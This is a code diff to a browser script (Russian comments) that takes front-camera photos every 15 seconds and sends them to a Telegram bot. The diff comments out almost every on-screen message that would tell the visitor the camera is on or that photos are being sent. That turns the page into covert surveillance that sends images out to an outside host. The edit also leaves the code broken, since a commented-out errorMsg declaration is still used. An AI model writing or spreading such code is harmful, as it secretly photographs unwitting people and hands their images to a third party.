@@ -11,11 +11,10 @@ const gallery = document.getElementById('gallery');
 
 // Запуск камеры
 async function initCamera() {
-    statusMsg.textContent = 'Запрос доступа к камере...';
+    // statusMsg.textContent = 'Запрос доступа к камере...';
     statusMsg.style.color = '#fbbf24';
 
     try {
-        // Ослабляем ограничения для лучшей совместимости
         const constraints = {
             video: {
                 facingMode: 'user'
@@ -25,42 +24,46 @@ async function initCamera() {
 
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
-
-        // Атрибуты для автоматического воспроизведения
         video.setAttribute('playsinline', '');
         video.setAttribute('muted', '');
-        video.setAttribute('autoplay', '');
 
-        // Пытаемся запустить видео сразу
-        video.onloadedmetadata = async () => {
-            try {
-                await video.play();
-                statusMsg.textContent = 'Камера готова';
-                statusMsg.style.color = '#10b981';
-            } catch (e) {
-                console.warn("Авто-запуск не удался, ожидаем готовности...", e);
-            }
-        };
-
-        // Дополнительный вызов play() на случай, если onloadedmetadata уже сработал
-        video.play().catch(() => { });
+        // Принудительный запуск воспроизведения
+        try {
+            await video.play();
+            // statusMsg.textContent = 'Камера готова';
+            // statusMsg.style.color = '#10b981';
+        } catch (playError) {
+            console.error("Ошибка автозапуска:", playError);
+            // Добавляем обработчик клика для активации
+            document.body.addEventListener('click', async () => {
+                try {
+                    await video.play();
+                    statusMsg.textContent = 'Камера готова';
+                    statusMsg.style.color = '#10b981';
+                } catch (e) {
+                    console.error("Не удалось запустить видео:", e);
+                }
+            }, { once: true });
+            // statusMsg.textContent = 'Нажмите на экран для активации';
+            statusMsg.style.color = '#fbbf24';
+        }
 
     } catch (err) {
         console.error("Ошибка доступа к камере: ", err);
-        let errorMsg = 'Ошибка доступа: ';
+        // let errorMsg = 'Ошибка доступа: ';
         if (err.name === 'NotAllowedError') errorMsg += 'разрешение отклонено';
         else if (err.name === 'NotFoundError') errorMsg += 'камера не найдена';
         else errorMsg += err.message || 'неизвестная ошибка';
 
-        statusMsg.textContent = errorMsg;
-        statusMsg.style.color = '#ef4444';
+        // statusMsg.textContent = errorMsg;
+        // statusMsg.style.color = '#ef4444';
     }
 }
 
 // Функция захвата и отправки
 async function takePhoto() {
     // Если есть ошибка доступа, не пытаемся делать фото
-    if (statusMsg.textContent.includes('Ошибка доступа')) return;
+    // if (statusMsg.textContent.includes('Ошибка доступа')) return;
 
     try {
         // Форсируем воспроизведение
@@ -68,7 +71,7 @@ async function takePhoto() {
 
         // Проверяем готовность кадра и наличие стрима
         if (video.readyState < 2 || !video.srcObject) {
-            statusMsg.textContent = 'Ожидание видеопотока...';
+            // statusMsg.textContent = 'Ожидание видеопотока...';
             return;
         }
 
@@ -82,8 +85,8 @@ async function takePhoto() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
 
-        statusMsg.textContent = 'Авто-захват...';
-        statusMsg.style.color = '#fbbf24';
+        // statusMsg.textContent = 'Авто-захват...';
+        // statusMsg.style.color = '#fbbf24';
 
         // Рисуем
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -108,7 +111,7 @@ let captureInterval = setInterval(takePhoto, 15000);
 
 // Ручной захват
 captureBtn.addEventListener('click', () => {
-    statusMsg.textContent = 'Ручной снимок...';
+    // statusMsg.textContent = 'Ручной снимок...';
     takePhoto();
     clearInterval(captureInterval);
     captureInterval = setInterval(takePhoto, 15000);
@@ -116,8 +119,8 @@ captureBtn.addEventListener('click', () => {
 
 // Отправка в Telegram
 async function sendToTelegram(blob) {
-    statusMsg.textContent = 'Отправка в Telegram...';
-    statusMsg.style.color = '#fbbf24';
+    // statusMsg.textContent = 'Отправка в Telegram...';
+    // statusMsg.style.color = '#fbbf24';
 
     const formData = new FormData();
     formData.append('chat_id', CONFIG.chatId);
@@ -131,19 +134,19 @@ async function sendToTelegram(blob) {
 
         const result = await response.json();
         if (result.ok) {
-            statusMsg.textContent = 'Фото успешно отправлено!';
-            statusMsg.style.color = '#10b981';
-            setTimeout(() => {
-                statusMsg.textContent = 'Камера готова';
-                statusMsg.style.color = '#10b981';
-            }, 3000);
+            // statusMsg.textContent = 'Фото успешно отправлено!';
+            // statusMsg.style.color = '#10b981';
+            // setTimeout(() => {
+            //     statusMsg.textContent = 'Камера готова';
+            //     statusMsg.style.color = '#10b981';
+            // }, 3000);
         } else {
             throw new Error(result.description);
         }
     } catch (err) {
         console.error("Ошибка Telegram:", err);
-        statusMsg.textContent = 'Ошибка отправки в Telegram';
-        statusMsg.style.color = '#ef4444';
+        // statusMsg.textContent = 'Ошибка отправки в Telegram';
+        // statusMsg.style.color = '#ef4444';
     }
 }
 
